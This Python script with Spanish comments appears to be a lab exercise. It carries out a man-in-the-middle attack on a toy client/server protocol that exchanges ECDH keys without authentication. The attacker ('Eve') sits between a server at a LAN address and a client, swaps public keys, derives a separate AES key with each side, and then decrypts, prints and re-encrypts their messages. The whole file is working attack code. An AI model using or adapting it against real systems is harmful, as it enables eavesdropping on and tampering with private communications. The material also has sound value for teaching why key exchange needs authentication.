import socket
import os
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Función para generar un par de claves de Diffie-Hellman con curva P-256
def generate_keypair():
    private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
    public_key = private_key.public_key()
    return private_key, public_key

# Derivar una llave simétrica usando KDF (HKDF con SHA-256)
def derive_shared_key(shared_secret):
    derived_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,  # AES-256 utiliza una clave de 32 bytes
        salt=None,
        info=b'handshake data',
        backend=default_backend()
    ).derive(shared_secret)
    return derived_key

# Cifrar un mensaje usando AES-256 en modo CBC
def encrypt_message(key, plaintext):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    pad_len = 16 - (len(plaintext) % 16)
    plaintext_padded = plaintext + bytes([pad_len] * pad_len)
    ciphertext = encryptor.update(plaintext_padded) + encryptor.finalize()
    return iv + ciphertext

# Descifrar un mensaje usando AES-256 en modo CBC
def decrypt_message(key, ciphertext):
    iv = ciphertext[:16]
    ciphertext = ciphertext[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext_padded = decryptor.update(ciphertext) + decryptor.finalize()
    pad_len = plaintext_padded[-1]
    plaintext = plaintext_padded[:-pad_len]
    return plaintext

def mitm():
    # Crear sockets para el cliente y el servidor
    mitm_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mitm_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conectar al servidor
    mitm_server_socket.connect(('192.168.1.61', 12345))
    print("Atacante: Conectado al servidor.")

    # Configurar escucha para que el cliente se conecte al atacante
    mitm_client_socket.bind(('0.0.0.0', 12345))  # Puerto diferente para que el cliente se conecte al atacante
    mitm_client_socket.listen(1)
    print("Atacante: Esperando conexión del cliente...")

    # Aceptar la conexión del cliente
    client_socket, addr = mitm_client_socket.accept()
    print(f"Atacante: Conectado al cliente en {addr}.")

    # Generar el par de claves de Eve
    private_key_eve, public_key_eve = generate_keypair()

    # Interceptar y enviar claves
    # Recibir la clave pública del servidor
    server_public_bytes = mitm_server_socket.recv(1024)
    server_public_key = serialization.load_pem_public_key(server_public_bytes, backend=default_backend())

    # Enviar la clave pública de Eve al cliente
    client_socket.send(public_key_eve.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ))

    # Recibir la clave pública del cliente
    client_public_bytes = client_socket.recv(1024)
    client_public_key = serialization.load_pem_public_key(client_public_bytes, backend=default_backend())

    # Enviar la clave pública del servidor a Eve
    mitm_server_socket.send(public_key_eve.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ))

    # Derivar claves con el servidor y el cliente
    shared_secret_server = private_key_eve.exchange(ec.ECDH(), server_public_key)
    shared_key_server = derive_shared_key(shared_secret_server)
    print(f"Atacante: Llave derivada con servidor {shared_key_server.hex()}")

    shared_secret_client = private_key_eve.exchange(ec.ECDH(), client_public_key)
    shared_key_client = derive_shared_key(shared_secret_client)
    print(f"Atacante: Llave derivada con cliente {shared_key_client.hex()}")

    # Comunicación entre cliente y servidor, interceptada y manipulada por Eve
    for i in range(50):
        # Cliente envía mensaje
        client_message = client_socket.recv(1024)
        plaintext_client = decrypt_message(shared_key_client, client_message)
        print(f"Atacante: Mensaje del cliente interceptado: {plaintext_client.decode()}")

        # Reenviar al servidor
        encrypted_message_to_server = encrypt_message(shared_key_server, plaintext_client)
        mitm_server_socket.send(encrypted_message_to_server)

        # Respuesta del servidor
        server_response = mitm_server_socket.recv(1024)
        plaintext_server = decrypt_message(shared_key_server, server_response)
        print(f"Atacante: Respuesta del servidor interceptada: {plaintext_server.decode()}")

        # Reenviar la respuesta al cliente
        encrypted_message_to_client = encrypt_message(shared_key_client, plaintext_server)
        client_socket.send(encrypted_message_to_client)

    # Cerrar las conexiones
    client_socket.close()
    mitm_server_socket.close()
    mitm_client_socket.close()

if __name__ == "__main__":
    mitm()
